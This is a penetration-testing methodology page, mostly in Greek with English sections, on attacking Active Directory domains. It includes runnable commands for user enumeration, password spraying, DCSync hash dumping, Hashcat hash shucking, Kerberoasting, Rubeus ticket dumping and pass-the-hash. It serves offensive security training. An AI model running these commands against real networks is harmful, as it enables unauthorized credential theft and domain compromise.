# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

**Active Directory** λειτουργεί ως θεμελιώδης τεχνολογία, επιτρέποντας στους **διαχειριστές δικτύου** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **users**, και **objects** εντός ενός δικτύου. Έχει σχεδιαστεί για κλιμάκωση, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμες **ομάδες** και **υποομάδες**, ενώ ελέγχει τα **δικαιώματα πρόσβασης** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία κύρια επίπεδα: **domains**, **trees**, και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή αντικειμένων, όπως **users** ή **devices**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι ομάδες αυτών των domains συνδεδεμένες με κοινή δομή, και ένα **forest** αντιπροσωπεύει τη συλλογή πολλαπλών trees, διασυνδεδεμένων μέσω **trust relationships**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Μπορούν να οριστούν συγκεκριμένα **δικαιώματα πρόσβασης** και **επικοινωνίας** σε κάθε ένα από αυτά τα επίπεδα.

Βασικές έννοιες στο **Active Directory** περιλαμβάνουν:

1. **Directory** – Περιέχει όλες τις πληροφορίες που αφορούν τα αντικείμενα του Active Directory.
2. **Object** – Αναφέρεται σε οντότητες μέσα στον κατάλογο, όπως **users**, **groups** ή **shared folders**.
3. **Domain** – Λειτουργεί ως δοχείο για αντικείμενα καταλόγου, με τη δυνατότητα πολλαπλά domains να συνυπάρχουν μέσα σε ένα **forest**, το καθένα διατηρώντας τη δική του συλλογή αντικειμένων.
4. **Tree** – Ομαδοποίηση domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Το κορυφαίο επίπεδο της οργανωτικής δομής στο Active Directory, αποτελούμενο από πολλαπλά trees με **trust relationships** μεταξύ τους.

Τα **Active Directory Domain Services (AD DS)** περιλαμβάνουν μια σειρά υπηρεσιών κρίσιμων για την κεντρική διαχείριση και την επικοινωνία εντός ενός δικτύου. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Κεντροποιεί την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **users** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Εποπτεύει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει εφαρμογές που χρησιμοποιούν κατάλογο μέσω του πρωτοκόλλου **LDAP**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την πιστοποίηση χρηστών σε πολλαπλές web εφαρμογές σε μία συνεδρία.
5. **Rights Management** – Βοηθά στην προστασία υλικού με πνευματικά δικαιώματα ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Κρίσιμο για την επίλυση **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να επιτίθεστε σε ένα AD πρέπει να κατανοήσετε πολύ καλά τη διαδικασία πιστοποίησης Kerberos.\
[**Διαβάστε αυτή τη σελίδα αν δεν ξέρετε ακόμη πώς λειτουργεί.**](kerberos-authentication.md)

## Γρήγορη Αναφορά

Μπορείτε να επισκεφθείτε το https://wadcoms.github.io/ για να δείτε γρήγορα ποιες εντολές μπορείτε να εκτελέσετε για να αναγνωρίσετε/εκμεταλλευτείτε ένα AD.

> [!WARNING]
> Η επικοινωνία Kerberos απαιτεί ένα πλήρως προσδιορισμένο όνομα (FQDN) για την εκτέλεση ενεργειών. Αν προσπαθήσετε να προσπελάσετε μια μηχανή μέσω διεύθυνσης IP, θα χρησιμοποιηθεί NTLM και όχι Kerberos.

## Αναγνώριση Active Directory (No creds/sessions)

Αν έχετε πρόσβαση σε ένα περιβάλλον AD αλλά δεν έχετε credentials/sessions μπορείτε να:

- **Pentest the network:**
- Σκανάρετε το δίκτυο, εντοπίστε μηχανήματα και ανοιχτές θύρες και προσπαθήστε να εκμεταλλευτείτε ευπάθειες ή να εξάγετε credentials από αυτά (για παράδειγμα, [printers could be very interesting targets](ad-information-in-printers.md)).
- Η ανίχνευση του DNS μπορεί να δώσει πληροφορίες για βασικούς servers στο domain όπως web, printers, shares, vpn, media, κ.λπ.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Ρίξτε μια ματιά στην γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε.
- **Check for null and Guest access on smb services** (αυτό δεν θα λειτουργήσει σε σύγχρονες εκδόσεις Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Ένας πιο αναλυτικός οδηγός για το πώς να κάνετε enumeration σε SMB server μπορεί να βρεθεί εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Ένας πιο αναλυτικός οδηγός για το πώς να κάνετε enumeration σε LDAP μπορεί να βρεθεί εδώ (δώστε **ειδική προσοχή στην ανώνυμη πρόσβαση**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Συλλέξτε credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Προσπελάστε host με [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συλλέξτε credentials **εκθέτοντας** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξάγετε usernames/ονόματα από εσωτερικά έγγραφα, social media, υπηρεσίες (κυρίως web) εντός των domain περιβαλλόντων και επίσης από τα δημόσια διαθέσιμα.
- Αν βρείτε τα πλήρη ονόματα εργαζομένων της εταιρείας, μπορείτε να δοκιμάσετε διαφορετικές AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο κοινές συναρτήσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3 γράμματα από κάθε όνομα), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Εντοπισμός χρηστών

- **Anonymous SMB/LDAP enum:** Δείτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητηθεί ένα μη έγκυρο username, ο server θα απαντήσει με τον Kerberos error κωδικό _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να προσδιορίσουμε ότι το username ήταν άκυρο. Τα **έγκυρα usernames** θα προκαλέσουν είτε την απόκριση του **TGT σε AS-REP** είτε το σφάλμα _KRB5KDC_ERR_PREAUTH_REQUIRED_, που δείχνει ότι ο χρήστης απαιτείται να εκτελέσει pre-authentication.
- **No Authentication against MS-NRPC**: Χρησιμοποιώντας auth-level = 1 (No authentication) έναντι της διεπαφής MS-NRPC (Netlogon) σε domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` μετά το bind στην διεπαφή MS-NRPC για να ελέγξει αν ο χρήστης ή ο υπολογιστής υπάρχει χωρίς κανένα credentials. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. Η έρευνα μπορεί να βρεθεί [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Αν βρήκατε έναν από αυτούς τους διακομιστές στο δίκτυο, μπορείτε επίσης να εκτελέσετε **user enumeration against it**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε το **όνομα των ανθρώπων που εργάζονται στην εταιρεία** από το recon step που θα έπρεπε να έχετε πραγματοποιήσει προηγουμένως. Με το όνομα και το επίθετο μπορείτε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανούς έγκυρους usernames.

### Knowing one or several usernames

Οκ, οπότε ξέρετε ότι έχετε ήδη ένα έγκυρο username αλλά όχι passwords... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Εάν ένας χρήστης **δεν έχει** το attribute _DONT_REQ_PREAUTH_ μπορείτε να **request a AS_REP message** για αυτόν τον χρήστη που θα περιέχει δεδομένα κρυπτογραφημένα από μια παράγωγη του password του χρήστη.
- [**Password Spraying**](password-spraying.md): Δοκιμάστε τους πιο **συνηθισμένους passwords** για κάθε έναν από τους ανακαλυφθέντες users — ίσως κάποιος χρήστης χρησιμοποιεί κακό password (έχετε υπόψη την password policy!).
- Σημειώστε ότι μπορείτε επίσης να **spray OWA servers** για να προσπαθήσετε να αποκτήσετε πρόσβαση στους mail servers των χρηστών.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ίσως να μπορείτε να **αποκτήσετε** κάποιους challenge **hashes** για να τους crackάρετε μέσω **poisoning** ορισμένων πρωτοκόλλων του **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Αν καταφέρατε να κάνετε enumeration του Active Directory θα έχετε **περισσότερα emails και καλύτερη κατανόηση του network**. Μπορεί να καταφέρετε να αναγκάσετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) για να αποκτήσετε πρόσβαση στο AD env.

### Steal NTLM Creds

Εάν μπορείτε να **έχετε access σε άλλους PCs ή shares** με τον **null ή guest user** θα μπορούσατε να **τοποθετήσετε αρχεία** (όπως ένα SCF file) που, αν ανοιχτούν με κάποιο τρόπο, θα **trigger an NTLM authentication against you** ώστε να μπορείτε να **steal** το **NTLM challenge** για να το crackάρετε:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** αντιμετωπίζει κάθε NT hash που ήδη κατέχετε ως πιθανό password για άλλες, πιο αργές μορφές των οποίων το key material προέρχεται άμεσα από το NT hash. Αντί να brute-force-άρετε μακρές passphrases σε Kerberos RC4 tickets, NetNTLM challenges, ή cached credentials, τροφοδοτείτε τα NT hashes στις Hashcat’s NT-candidate modes και αφήνετε το εργαλείο να επιβεβαιώσει επαναχρησιμοποίηση passwords χωρίς ποτέ να μάθει το plaintext. Αυτό είναι ιδιαίτερα ισχυρό μετά από domain compromise όπου μπορείτε να συλλέξετε χιλιάδες τρέχοντα και ιστορικά NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Για αυτή τη φάση χρειάζεται να έχετε **compromised the credentials or a session of a valid domain account.** Αν έχετε κάποια έγκυρα credentials ή ένα shell ως domain user, **πρέπει να θυμάστε ότι οι επιλογές που δόθηκαν παραπάνω παραμένουν επιλογές για να compromisere άλλους users.**

Πριν ξεκινήσετε το authenticated enumeration θα πρέπει να γνωρίζετε τι είναι το **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Το να έχετε compromised έναν λογαριασμό είναι ένα **μεγάλο βήμα για να ξεκινήσετε το compromisation ολόκληρου του domain**, γιατί θα μπορείτε να ξεκινήσετε την **Active Directory Enumeration:**

Σχετικά με [**ASREPRoast**](asreproast.md) τώρα μπορείτε να βρείτε κάθε πιθανό vulnerable user, και σχετικά με [**Password Spraying**](password-spraying.md) μπορείτε να πάρετε μια **λίστα όλων των usernames** και να δοκιμάσετε το password του compromised account, empty passwords και νέες υποσχόμενες passwords.

- Μπορείτε να χρησιμοποιήσετε το [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείτε επίσης να χρησιμοποιήσετε [**powershell for recon**](../basic-powershell-for-pentesters/index.html) το οποίο θα είναι πιο stealthy
- Μπορείτε επίσης να [**use powerview**](../basic-powershell-for-pentesters/powerview.md) για να εξάγετε πιο λεπτομερείς πληροφορίες
- Ένα ακόμα εκπληκτικό εργαλείο για recon σε active directory είναι το [**BloodHound**](bloodhound.md). Δεν είναι **πολύ stealthy** (ανάλογα με τις μεθόδους συλλογής που χρησιμοποιείτε), αλλά **αν δεν σας νοιάζει**, θα πρέπει οπωσδήποτε να το δοκιμάσετε. Βρείτε πού οι users μπορούν RDP, βρείτε paths προς άλλες groups, κ.λπ.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) καθώς μπορεί να περιέχουν ενδιαφέροντα στοιχεία.
- Ένα **εργαλείο με GUI** που μπορείτε να χρησιμοποιήσετε για να enumerate τον κατάλογο είναι το **AdExplorer.exe** από τη **SysInternal** Suite.
- Μπορείτε επίσης να ψάξετε στη βάση LDAP με **ldapsearch** για να αναζητήσετε credentials σε πεδία _userPassword_ & _unixUserPassword_, ή ακόμα και στο _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες μεθόδους.
- Αν χρησιμοποιείτε **Linux**, μπορείτε επίσης να enumerate το domain χρησιμοποιώντας [**pywerview**](https://github.com/the-useless-one/pywerview).
- Μπορείτε επίσης να δοκιμάσετε αυτοματοποιημένα εργαλεία όπως:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Είναι πολύ εύκολο να λάβετε όλα τα domain usernames από Windows (`net user /domain` ,`Get-DomainUser` ή `wmic useraccount get name,sid`). Σε Linux, μπορείτε να χρησιμοποιήσετε: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Ακόμα κι αν αυτή η Enumeration ενότητα φαίνεται μικρή, είναι το πιο σημαντικό μέρος από όλα. Πρόσβαση στους συνδέσμους (κυρίως σε αυτούς του cmd, powershell, powerview και BloodHound), μάθετε πώς να enumerate ένα domain και εξασκηθείτε μέχρι να νιώσετε άνετα. Κατά τη διάρκεια ενός assessment, αυτή θα είναι η κρίσιμη στιγμή για να βρείτε τον δρόμο σας προς DA ή για να αποφασίσετε ότι δεν μπορεί να γίνει τίποτα.

### Kerberoast

Kerberoasting περιλαμβάνει την απόκτηση **TGS tickets** που χρησιμοποιούνται από services συνδεδεμένα με user accounts και το cracking της κρυπτογράφησής τους — η οποία βασίζεται στα passwords των χρηστών — **offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Μόλις έχετε αποκτήσει κάποια credentials μπορείτε να ελέγξετε αν έχετε πρόσβαση σε κάποια **μηχανή**. Για αυτό το σκοπό, μπορείτε να χρησιμοποιήσετε **CrackMapExec** για να προσπαθήσετε να συνδεθείτε σε πολλαπλούς servers με διαφορετικά πρωτόκολλα, ανάλογα με τα port scans σας.

### Local Privilege Escalation

Αν έχετε compromised credentials ή ένα session ως κανονικός domain user και έχετε **πρόσβαση** με αυτόν τον χρήστη σε οποιαδήποτε μηχανή στο domain, θα πρέπει να προσπαθήσετε να βρείτε τρόπο να **ανεβάσετε δικαιώματα τοπικά και να lootάρετε για credentials**. Αυτό οφείλεται στο ότι μόνο με local administrator privileges θα μπορέσετε να **dump hashes άλλων χρηστών** στη μνήμη (LSASS) και τοπικά (SAM).

Υπάρχει μια ολοκληρωμένη σελίδα σε αυτό το βιβλίο για [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) και ένα [**checklist**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσετε να χρησιμοποιήσετε το [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Είναι πολύ **απίθανο** να βρείτε **tickets** στον τρέχοντα user που να σας δίνουν permission για πρόσβαση σε αναπάντεχους πόρους, αλλά μπορείτε να ελέγξετε:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Εάν καταφέρατε να εντοπίσετε το Active Directory θα έχετε **περισσότερες διευθύνσεις email και καλύτερη κατανόηση του δικτύου**. Μπορεί να καταφέρετε να εκτελέσετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Τώρα που έχετε μερικά βασικά credentials θα πρέπει να ελέγξετε αν μπορείτε να **βρείτε** οποιαδήποτε **ενδιαφέροντα αρχεία που μοιράζονται μέσα στο AD**. Μπορείτε να το κάνετε χειροκίνητα αλλά είναι μια πολύ βαρετή επαναλαμβανόμενη εργασία (και ακόμα περισσότερο αν βρείτε εκατοντάδες docs που πρέπει να ελέγξετε).

[**Ακολουθήστε αυτόν τον σύνδεσμο για να μάθετε για τα εργαλεία που μπορείτε να χρησιμοποιήσετε.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Εάν μπορείτε να έχετε **πρόσβαση σε άλλους PCs ή shares** μπορείτε να **τοποθετήσετε αρχεία** (π.χ. SCF file) τα οποία αν κάποιος τα ανοίξει θα **προκαλέσουν NTLM authentication εναντίον σας**, ώστε να μπορείτε να **κλέψετε** το **NTLM challenge** για να το σπάσετε:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε authenticated user να **compromise τον domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Για τις παρακάτω τεχνικές ένας κανονικός domain user δεν αρκεί, χρειάζεστε κάποια ειδικά privileges/credentials για να πραγματοποιήσετε αυτές τις επιθέσεις.**

### Hash extraction

Ελπίζουμε να καταφέρατε να **compromise κάποιο local admin** account χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) συμπεριλαμβανομένου relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Στη συνέχεια, είναι ώρα να dump-άρετε όλα τα hashes από τη μνήμη και τοπικά.\
[**Διαβάστε αυτή τη σελίδα για διαφορετικούς τρόπους απόκτησης των hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις έχετε το hash ενός χρήστη**, μπορείτε να το χρησιμοποιήσετε για να **impersonate** τον χρήστη.\
Πρέπει να χρησιμοποιήσετε κάποιο **tool** που θα **εκτελέσει** την **NTLM authentication χρησιμοποιώντας** εκείνο το **hash**, **ή** μπορείτε να δημιουργήσετε ένα νέο **sessionlogon** και να **inject** εκείνο το **hash** μέσα στο **LSASS**, έτσι όταν πραγματοποιηθεί οποιαδήποτε **NTLM authentication**, θα χρησιμοποιηθεί εκείνο το **hash.** Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.\
[**Διαβάστε αυτή τη σελίδα για περισσότερες πληροφορίες.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η επίθεση στοχεύει να **χρησιμοποιήσει το user NTLM hash για να ζητήσει Kerberos tickets**, ως εναλλακτική στην κοινή μέθοδο Pass The Hash over NTLM protocol. Επομένως, αυτό μπορεί να είναι ιδιαίτερα **χρήσιμο σε δίκτυα όπου το NTLM protocol είναι απενεργοποιημένο** και μόνο **Kerberos επιτρέπεται** ως authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στην μέθοδο επίθεσης **Pass The Ticket (PTT)**, οι επιτιθέμενοι **κλέβουν το authentication ticket ενός χρήστη** αντί για τον κωδικό ή τις τιμές hash. Το κλεμμένο ticket χρησιμοποιείται στη συνέχεια για να **impersonate τον χρήστη**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε πόρους και υπηρεσίες εντός ενός δικτύου.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Εάν έχετε το **hash** ή το **password** ενός **local administrato r** θα πρέπει να προσπαθήσετε να **συνδεθείτε τοπικά** σε άλλους **PCs** με αυτό.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **θορυβώδες** και το **LAPS** θα το **μετριάσει**.

### MSSQL Abuse & Trusted Links

Εάν ένας χρήστης έχει προνόμια για **access MSSQL instances**, θα μπορούσε να τα χρησιμοποιήσει για να **execute commands** στον MSSQL host (αν τρέχει ως SA), να **steal** το NetNTLM **hash** ή ακόμη και να πραγματοποιήσει μια **relay** **attack**.\  
Επίσης, αν ένα MSSQL instance είναι trusted (database link) από διαφορετικό MSSQL instance, και ο χρήστης έχει προνόμια στη trusted database, θα μπορέσει να **use the trust relationship to execute queries also in the other instance**. Αυτές οι trusts μπορούν να αλυσιδωθούν και σε κάποιο σημείο ο χρήστης μπορεί να βρει μια λανθασμένα ρυθμισμένη βάση δεδομένων όπου θα μπορεί να εκτελέσει εντολές.\  
**Οι συνδέσεις μεταξύ βάσεων δεδομένων λειτουργούν ακόμα και διαμέσου forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Πακέτα τρίτων για inventory και deployment συχνά εκθέτουν ισχυρές διαδρομές προς credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν βρείτε οποιοδήποτε Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε domain προνόμια στον υπολογιστή, θα μπορείτε να dump TGTs από τη μνήμη κάθε χρήστη που κάνει logins στον υπολογιστή.\  
Έτσι, αν ένας **Domain Admin logins onto the computer**, θα μπορέσετε να dump το TGT του και να τον impersonate χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\  
